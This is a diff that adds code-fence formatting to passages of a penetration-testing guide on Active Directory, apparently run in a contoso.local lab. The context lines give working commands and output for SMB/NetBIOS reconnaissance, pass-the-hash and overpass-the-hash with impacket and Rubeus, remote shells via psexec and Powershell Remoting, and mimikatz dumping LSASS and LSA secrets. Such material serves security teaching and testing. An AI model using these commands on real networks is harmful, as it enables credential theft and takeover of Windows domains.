@@ -932,7 +932,7 @@ $ nbtscan 192.168.100.0/24
 ```                                                                    
 NetBIOS scan
 Also, a very popular service that listens in the port 445 is SMB, heavily used for Windows computers to communicate each other. You can perform an port scan to discover Windows computers and you can even take advantage of the NTLM authentication negotiation to retrieve the machine name. You can perform an scan with ntlm-info or nmap smb-os-discovery script.
-
+```diff 
 $ ntlm-info smb 192.168.100.0/24
 
 Target: 192.168.100.2
@@ -960,6 +960,7 @@ DnsDomain: contoso.local
 DnsTree: contoso.local
 Version: 10.0.19041
 OS: Windows 10 | Windows Server 2019 | Windows Server 2016
+```
 SMB scan
 Finally, you can also scan for other ports like 135 (RCP) or 139 (NetBIOS session service) with nmap.
 
@@ -974,7 +975,7 @@ The first and probably the most common one is to use RPC with SMB. This is the m
 These tools usually execute commands by using some RPC interface and send/receive the input/output by using SMB pipes. Normally, the tools only require the 445 port (SMB) open in order to execute commands, but some like wmiexec.py will also need the port 135 (RPC over TCP).
 
 Additionally, it is possible for these tools to perform a Pass-The-Hash by using the NT or LM hash. The impacket tools have a parameter to use the NT or LM hash directly, whereas in order to use it with PsExec, you must inject the NT hash in the Windows session with mimikatz.
-
+```diff 
 $ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -991,6 +992,7 @@ The system cannot find message text for message number 0x2350 in the message fil
 b'Not enough memory resources are available to process this command.\r\n'
 C:\Windows\system32>whoami
 nt authority\system
+  ```
 psexec.py with a NT hash
 This way you are using NTLM as authentication mechanism, which may not the best option since in Active Directory, Kerberos is used by default.
 
@@ -999,7 +1001,7 @@ To use Kerberos you need to provide a Kerberos ticket to the mentioned tools. In
 In order to get a Kerberos ticket to use, you can request one by using the user password, the NT hash (Overpass-the-Hash) or the Kerberos keys (Pass-The-Key) or you can simply steal a ticket from a Windows or Linux machine and use it (Pass-The-Ticket).
 
 You should take into account that Windows and Linux machines (and the tools oriented to them) use different ticket file formats so you may have problems moving Linux tickets to a Windows machine or vice versa. You can convert the tickets between the different formats by using ticket_converter or cerbero.
-
+```diff 
 `$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -1020,15 +1022,17 @@ The system cannot find message text for message number 0x2350 in the message fil
 (c) Microsoft Corporation. All rights reserved.
 b'Not enough memory resources are available to process this command.\r\n'
 C:\Windows\system32>`
+  ```
 psexec.py with Kerberos authentication
 When using Kerberos authentication you will need to pass as target to the tools the hostname (DNS name or NetBIOS name) of the remote machine instead of its IP. This is cause Kerberos authentication uses the hostname to identify the service of the remote machine and provide the right ticket to authenticate against it.
 
 If you use the IP address you will get the following error:
-
+```diff 
 $ psexec.py contoso.local/Anakin@192.168.100.10 -k -no-pass
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+  ```
 Using IP address with Kerberos authentication
 Connecting with Powershell Remoting
 An alternative to RPC/SMB to connect to a Windows machine is Powershell Remoting, that will allow you to get a Powershell session in the remote machine. The Powershell remoting service listens in the port 5985 and is enabled by default in the Windows Server machines.
@@ -1036,7 +1040,7 @@ An alternative to RPC/SMB to connect to a Windows machine is Powershell Remoting
 You can use Powershell Remoting from Windows by using many CmdLets and parameters available in Powershell. From a Linux machine you can use evil-winrm.
 
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, you can pass them to the application as a parameters or configure the ccache file as in impacket. In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using Rubeus or mimikatz.
-
+```diff 
 PS C:\> .\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt
 
    ______        _
@@ -1079,6 +1083,7 @@ contoso\administrator
 [dc01]: PS C:\Users\Administrator\Documents> hostname
 dc01
 [dc01]:
+```
 Using Powershell Remoting with Overpass-the-Hash
 Connecting with RDP
 One common method to connect to a remote machine in Windows is RDP (Remote Desktop Protocol). You can use RDP from a Windows machine by using the default client "Remote Desktop Connection" (mstsc). From Linux there are excellent clients like rdesktop, freerdp or remmina.
@@ -1125,7 +1130,8 @@ Specifically, in order to access to LSASS process memory, you need the SeDebugPr
 
 Moreover, SeDebugPrivilege must be enabled in the process that tries to dump the LSASS memory. By default is enabled in Powershell and disabled in CMD (and therefore in their child processes). If you are launching mimikatz, you can enable it by using the privilege::debug command. In other case you can launch the process with Powershell using powershell.exe <command>, or using some tool like sepriv to enable it in CMD.
 
-```diff C:\>.\mimikatz.exe
+```diff 
+  C:\>.\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -1191,6 +1197,7 @@ HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DefaultPassword
 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM
 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\NL$KM
 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\_SC_mysql
+  ```
 LSA Secrets keys
 In the LSA secrets you can find:
 
